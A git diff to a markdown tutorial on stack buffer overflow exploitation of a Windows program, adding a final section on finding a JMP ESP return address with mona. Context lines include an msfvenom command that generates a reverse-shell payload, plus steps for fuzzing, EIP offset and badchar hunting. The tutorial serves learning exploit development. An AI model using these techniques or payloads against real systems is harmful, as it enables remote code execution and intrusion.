@@ -105,6 +105,7 @@ Once we run this program, we will launch the script and get the calculator to ru
 ````sh
 # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=127.0.0.1 LPORT=21  -f python
 ````
+---
 ## Second part: Exploitation step by step
 
 We will start looking to find the amount of padding necessary to achieve the BoF of the program. To do this we will launch 1000/2000/3000 bytes until the program stops working.
@@ -162,6 +163,7 @@ In the padding part of the above script we will enter the content of pattern.txt
 ````
 !mona pattern_offset xxxxxx <---- EIP value
 ````
+---
 Once we have control of EIP, we only have to get the badchars, find a return address without ASLR and write the shellcode.
 To be able to locate the badchars we have two options:
 - Find them manually
@@ -183,4 +185,19 @@ We will create a hexadecimal string with all values ​​except "\x00", with th
 3. We use this command to compare them: "!Mona compare -f C:\logs...bytearray.bin -a ADDRESS".
 4. We repeat the process until there is no badchar left.
 
+---
+Finally, we must find a suitable memory address to be able to return, for this we will use the following command:
+````
 
+!mona jmp -r esp
+````
+
+We will select the appropriate address, in this case (0x1010539F). 
+
+**Important**
+
+In the script write it backwards as it is in litle-endian.
+
+It would only remain to write the shellcode and execute it.
+
+***Thank you for your attention.***
